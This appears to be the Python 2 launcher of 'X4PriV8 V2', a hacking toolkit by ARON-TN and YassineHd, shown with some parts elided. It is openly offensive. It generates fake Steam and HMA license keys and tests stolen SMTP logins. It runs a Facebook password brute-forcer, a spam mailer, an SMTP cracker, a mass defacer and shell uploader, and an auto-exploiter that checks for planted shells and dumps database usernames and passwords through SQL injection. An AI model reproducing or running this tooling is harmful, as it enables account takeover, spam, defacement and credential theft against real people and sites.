#!/usr/bin/env python
# encoding: utf-8
import string,os,smtplib,sys
import re,socket,binascii,time
import json,random,threading,Queue
import pprint,urlparse,telnetlib
import hashlib,urllib2,glob,sqlite3
import urllib,argparse,marshal,base64
from random import *
...
if not os.path.isdir('Result'):
  os.mkdir('Result')
def steam() :
 if not os.path.isdir('Result/Generator'):
  os.mkdir('Result/Generator')
 print("""   
 {k}(               )     )  
 )\ )  *   )  ( /(  ( /(  
(()/(` )  /(  )\()) )\()) 
...
{a}   ST=Steam / KY=KEY
 ...
 for az in range(int(az)) :
  mark = ''.join(choice(string.ascii_letters + string.digits) for _ in range(5)).upper() +('-')+''.join(choice(string.ascii_letters + string.digits) for _ in range(5)).upper()+('-')+''.join(choice(string.ascii_letters + string.digits) for _ in range(5)).upper()
  ii+=1
  print('%s / %s By MegaBot')%(ii,mark)
  save = open("Result/Generator/steam.txt", 'a').write(mark + '\n')
 print("{k}Keys Saved In {r}Result/Generator/steam.txt").format(k=lazra9,r=la7mar)
def fitromailon(x, y):
 if x!=0 :
...
{c} /_/  \_,_/\__/\__/_.__/\___/\___/_/\_\       
 ...
 os.system ('perl tools/fbbrute.pl '+raw_input ('enter mail >')+' '+raw_input('enter list password >'))
def hma():
 if not os.path.isdir('Result/Generator'):
  os.mkdir('Result/Generator')
 print("""
...
{a}   HM=HMA/K=Key                    
 ...
 for az in range(int(ze)) :
  ii+=1
  mark = ''.join(choice(string.ascii_letters + string.digits) for _ in range(6)).upper() +('-')+ ''.join(choice(string.ascii_letters + string.digits) for _ in range(6)).upper() +('-')+ ''.join(choice(string.ascii_letters + string.digits) for _ in range(6)).upper()
  print('%s / %s By MegaBot')%(ii,mark)
  save = open("Result/Generator/hma.txt", 'a').write(mark + '\n')
 print("{k}Keys Saved In {r}Result/Generator/Hma.txt").format(k=lazra9,r=la7mar)
def tommy():
 if not os.path.isdir('Result/filter'):
  os.mkdir('Result/filter')
...
''')
 for amir in open(raw_input('[*] Your List :'),'r').read().splitlines():
  amir=amir.lower()
  a=amir.split('@')[1].split('.')[0]
  aron=a+'.txt'
  save=open('Result/filter/'+aron,'a').write(amir+'\n')
  print(amir.split(':')[0]+'===> Filtered To %s')%(aron) 
def tee1 ():
 print("""\n\033[91m...####...##...##..######..#####......######..######...####...######..######..#####..
...####...##...##..######..#####......######..######...####...######..######..#####..
 .##......###.###....##....##..##.......##....##......##........##....##......##..##.
 ...
 se= raw_input("Host : ")
 p = raw_input("Port : ")
 mm=raw_input("Email SMTP : ")
 pp=raw_input("Smtp PassWord : ")
 tt=raw_input("Your Email : ")
 t3 = 'Host :%s\n Port : %s\n mail :%s\npassword : %s\n '%(se,p,mm,pp)
 msg = MIMEMultipart()
 msg['From'] ='MegaBot'
 msg['To'] = tt
 msg['Subject'] = 'SMTP WORK'
 ...
 server.ehlo()
 server.login(mm,pp)
 server.sendmail('MegaBot BOT',tt,msg.as_string())
 server.quit()
 print ("Mail successfully sended to " + tt)
def logo():
 print"""{t} __   __  _______  _______  _______    _______  _______  _______ 
|  |_|  ||       ||       ||   _   |  |  _    ||       ||       |
|       ||    ___||    ___||  |_|  |  | |_|   ||   _   ||_     _|
|       ||   |___ |   | __ |       |  |       ||  | |  |  |   |  
|       ||    ___||   ||  ||       |  |  _   | |  |_|  |  |   |  
...
|_|   |_||_______||_______||__| |__|  |_______||_______|  |___|  
                 PriV8 Bot | ARON-TN & YassineHd             
                          Fixed Version                                        
               [=] CodED By ARON-TN & YassineHd [=]
                         It's X4PriV8 V2 """.format(t=la5dhar)
def zabour():
 print ('''
...
{re}~{r}> About Aron-Tn {re}: {y}
     Coder     {re}: {b}ARON-TN{y}
     E-mail    {re}: {r}[{b} aron.tn.official@gmail.com {r}] {y}
     Youtube   {re}: {r}[{b}https://www.youtube.com/AronTnXofficial Or ARON-TN {r}]{y}
     Github    {re}: {r}[{b}https://www.github.com/ARON-TN{r}]{c}
{re}~{r}> About YassineHd {re}: {y}
  {g}Coder     {re}: {b}YassineHd{y}
...
""")
 ...
 if __name__ == "__main__":
     ...
     print('\n')
     reversed_dns = urlopen('http://api.hackertarget.com/reverseiplookup/?q=' + badip).read()
     geoip = urlopen('http://api.hackertarget.com/geoip/?q=' + badip).read()
     nmap = urlopen('http://api.hackertarget.com/nmap/?q=' + badip).read()
     httpheaders = urlopen('http://api.hackertarget.com/httpheaders/?q=' + badip).read()
     tracert = urlopen('http://api.hackertarget.com/mtr/?q=' + badip).read()
...
def zone():
 if not os.path.isdir('Result/Zone-h'):
  os.mkdir('Result/Zone-h')
 print '''{g}       ---------------------------------------
      /  ____                 _  _           /0
     /  |_  /___ _ _  ___ ___| || |         / 0
    /    / // _ \ ' \/ -_)___| __ |        /  0
...
|               _______                | _____0
|______________|MegaBot|_______________|/                                              
 ...
 with open(urls, 'r') as urls:
  for line in urls:
     ...
     if 'http://' not in clean:
       url = 'http://'+clean
       with open('Result/Zone-h/zone-h.txt', 'a') as myfile:
        myfile.write('http://'+clean)
        myfile.write('\n')
  print('''SAVED IN {r} zone-h.txt''').format(r=la7mar)
def s3nd3r():
  print('''
  W3LC0M3 SP4MM3RS BEFORE USING THIS
  TOOLS U NEED SMTP :v
  +++++++++++++++++++++++++++++++++++++++++++++
  PUT UR SMTP IN > tools/sender/setting/Gx.settings.php
  PUT UR MAILIST IN > tools/sender/file/maillist/list.txt
  PUT UR LETTER IN > tools/sender/file/letter/letter.html
  +++++++++++++++++++++++++++++++++++++++++++++
  ...
  if maya=='1':
   os.system('tools/sender/php ron.php')
  elif maya=='2':
   if system() == 'Windows':
    print("""We Can't install PHP moDule In Windows """)
   elif system()== 'Linux':
   ...
   main()
def smtpip():
  print ("""  Put UR LIST tools/Smtp-ips/ips.txt list IN FILE ips.txt Before Run Tool
  [1] Run Tool
  [2] EXIT
  """)
  ...
  if fosta=='1':
   if system() == 'Linux':
    os.system('python2 tools/Smtp-ips/vu.py 20 bad')
   elif system() == 'Windows':
    os.system('python tools/Smtp-ips/vu.py 20 bad')
def smtpcra():
 raw_input('put your combo in tools/smtp-cracker then press enter ..')
 if system() == 'Windows':
   os.system('tools/smtp-cracker/config.py')
 if system() == 'Linux':
   os.system('python tools/smtp-cracker/config.py') 
def hackerz():
 sanfara=raw_input('List  > ')
 print('''What Do U NEED TO UPLOAD ?
	[1] FILE.txt (HACKED BY)
	[2] FILe.JPG (SHELL OR PHOTO)''')
 mr=raw_input('Mega > ')
 if mr=='1':
  os.system('perl tools/d3f4c3r/ok.pl '+sanfara+' tools/d3f4c3r/hack.txt')
 elif mr=='2':
  os.system('perl tools/d3f4c3r/ok.pl '+sanfara+' tools/d3f4c3r/hack.jpg')
def url():
  print('''
  U NEED PHP MODULE TO RUN THIS TOOL
  [1] RUN TOOL
  ...
  if maya=='1':
   xn=raw_input('url >')
   os.system('php tools/cut-url/kv.php '+xn)
  elif maya=='2':
   if system() == 'Windows':
    print("""i Can't install PHP moDule In Windows """)
   elif system()== 'Linux':
    os.system('sudo apt-get install php')
    xn=raw_input('url >')
    os.system('php tools/cut-url/kv.php '+xn)
class zalzoumiya():
 def __init__(self):
  ...
  f = open ( 'Result/PassMaker/'+name+'.txt', 'w' )
  f.write (os.linesep.join(unique_list))
  f.close()
  lines = 0
  fcount = open ( 'Result/PassMaker/'+name+'.txt', 'r' )
  for line in fcount:
	lines += 1
  fcount.close()
  print BUS+"[*]"+WHITE+" Saving dictionary to "+GREEN+"[Result/PassMaker/"+name+".txt]"+WHITE+", counting "+GREEN+"["+str(lines)+"]"+WHITE+" words."
  print BUS+"[*]"+WHITE+" Now load your pistolero with "+GREEN+"[Result/PassMaker/"+name+".txt]"+WHITE+" and shoot! Good luck!"
  print WHITE+""
  print WHITE+""
...
'''
        ...
        self.EMail = 'x192.118.48@hotmail.com'
            ...
            try:
                ...
                if rr:
                    ...
                    if 'Vuln!!' in ShellCheck.text:
                        ...
                        with open('Result/Shell.txt', 'a') as writer:
                        ...
                        if 'Vuln!!' in IndexCheck.text:
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('Result/Index.txt', 'a') as writer:
                                writer.write('http://' + site + '/br4in.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            self.Print_Vuln_index(site + '/images/br4in.htm')
                            with open('Result/Index.txt', 'a') as writer:
    ...
    def Com_s5_media_player(self, site):
        try:
            ...
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                ...
                with open('Result/Config.txt', 'a') as ww:
    ...
    def HD_WebPlayerSqli(self, site):
        try:
            ...
            if '<?xml version="' in check.text.encode('utf-8'):
                ...
                with open('Result/Sqli.txt', 'a') as writer:
                    writer.write('------------------------------' + '\n' + 'Domain: ' + site + '\n' +
                                 'Username : ' + username + '\n' + 'Password : ' + password + '\n')
            else:
...
def t3():
 ...
 class RowDataBAse(object):
     def __init__(self):
         ...
         for r in results:
             with open('Result/urls.txt', 'a') as xxx:
                 xxx.write(r[1] + '\n')
         print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + 'Saved In' + self.g + ' Result/urls.txt'
         cursor.close()
         connection.close()
...
{r}/{g}!{r}\ {r}Please  If you got Problem or any new idea contact me .{y}
 ...
 if zz=='1':
  try:
   if os.name=='nt':
    os.system('cd tools && git clone https://github.com/Aron-tn/X4PriV8_V1/ && cd X4Priv8_V1 && X4PriV8.py')
   else:
    os.system("cd tools && git clone https://github.com/Aron-tn/X4PriV8_V1/ && cd X4Priv8_V1 && python2 X4PriV8.py")
  except:
   print('tool deleted from github !')
 elif zz=='2':
  print '''
   _        _____          ___ _               
...
'''
  ...
  os.system('perl tools/cms/fuckers.pl')
 elif zz=='13':
  ko()
 elif zz=='14':
  url()
 elif zz=='15':
  if not os.path.isdir('Result/PassMaker'):
   os.mkdir('Result/PassMaker')
  zalzoumiya()
 elif zz=='16':
  k1=raw_input('site :')
  if system() == 'Windows':
   os.system('python tools/Gatherer/setup.py install && cls && wig.py '+k1)
  elif system() == 'Linux':
  ...
  sony=raw_input('Mega > ')
  if sony=='1':
   os.system('php tools/vuln/rhawk.php')
  elif sony=='2':
   if system() == 'Windows':
    print("""Can't install PHP moDule In Windows """)
   elif system() == 'Linux':
    os.system('sudo apt-get install php')
    os.system('php tools/vuln/rhawk.php')
 elif zz=='18':
  if system() == 'Windows':
   qws=raw_input('list > ')
   kori=' -t 15'
   os.system('ppm install Parallel-ForkManager && cpan -i Parallel::ForkManager && cls && perl tools/0day/dody.pl -u '+qws+kori)
  if system() == 'Linux':
   qws=raw_input('list > ')
   kori=' -t 15'
   os.system('perl tools/0day/dody.pl -u '+qws+kori)
 elif zz=='19':
  os.system('perl tools/Th3inspector/bb.pl ')
 elif zz=='20':
  k1=raw_input('site :')
  if system() == 'Windows':
   os.system('python tools/fucker/xfucker.py '+k1)
  elif system() == 'Linux':
   os.system('python2 tools/fucker/xfucker.py '+k1)
 elif zz=='21':
  if not os.path.isdir('Result/BadMod'):
   os.mkdir('Result/BadMod')
  print('''
   U NEED PHP MODULE TO RUN THIS TOOL
   [1] RUN TOOL
   [2] INSTALL MODULE
  ...
  if faleh=='1':
   os.system('php tools/BadMod/BadMod.php')
  elif faleh=='2': 
   if system() == 'Windows':
    print("""Can't install PHP moDule In Windows """)
   if system() == 'Linux':
    os.system('sudo apt install php && sudo apt-get install php-curl && php tools/BadMod/BadMod.php')
 elif zz=='22':
  print('''\n\033[91mDo u Have Sites ?
  [1] = get Sites
  [2] = I Want To Check MY List Sites''')
  t=raw_input('Mega > ')
  if t=='1':
   os.system('perl tools/XAttacker/dork.pl')
  elif t=='2':
   os.system('perl tools/XAttacker/XAttacker.pl')
 elif zz=='23':
  os.system('perl tools/bazzoka/bazooka.pl ')
 elif zz=='24':  
  print('''   [1] Run Tool
   [2] Install Module''')
  ...
  if sellemi=='1':
   kk=' -t 999999999999'
   os.system('perl tools/izocin/ttt3.pl -u '+flo+kk)
  elif sellemi=='2':
   if system() == 'Windows':
  ...
  if system() == 'Windows':
   os.system('python RxR/boy.py')
  if system() == 'Linux':
   os.system('python2 RxR/boy.py')
 elif zz=='26':
  os.system('perl tools/Xbrang/bit.pl')
 elif zz=='27':
  os.system('perl tools/SQL/asq.pl')
 elif zz=='28':
  os.system('perl tools/DrHEx/slo.pl')
 elif zz=='29':
  print('''https://sieuthuthuat.com/bin/ or https://sieuthuthuat.com/check/''')
 elif zz=='30':
  if system() == 'Windows':
   os.system('tools/ProxyBroker/a.py')
  if system() == 'Linux':
   os.system('python2 tools/ProxyBroker/a.py')
 elif zz=='31':
  os.system('perl tools/V5/beast.pl')
 elif zz=='32':
  AutoExploiter()
 elif zz=='33':
  os.system('python2 tools/Hasher/hashti.py')
 elif zz=='34':
  os.system('bash tools/ppl/pip.sh')
 elif zz=='35':
  os.system('bash tools/apple/cc.sh')
 elif zz=='36':
  fnhack()
 elif zz=='37':
  os.system('perl tools/wp/bfwdps.pl')
 elif zz=='38':
  print('''
  [1]steam
  [2]HMA ''')
  ...
  if system() == 'Windows':
   os.system('python tools/osif/cdd.py')
  if system() == 'Linux':
   os.system('pip2 install -r tools/osif/requirements.txt && python2 tools/osif/cdd.py')
 elif zz=='40':
  if system() == 'Windows':
   os.system('tools/xsmash/f4c.py')
  if systemm() == 'Linux':
   os.system('python2 tools/xsmash/f4c.py')
 elif zz=='41':
  os.system('perl tools/joomla/qs.pl')
 elif zz=='42':
  if system() == 'Windows':
   os.system('python tools/fbi/ccv.py')
  if system() == 'Linux':
   os.system('pip2 install -r tools/fbi/requirements.txt && python2 tools/fbi/ccv.py')
 elif zz=='98':
  zibyy()
 elif zz=='99':
  samara()
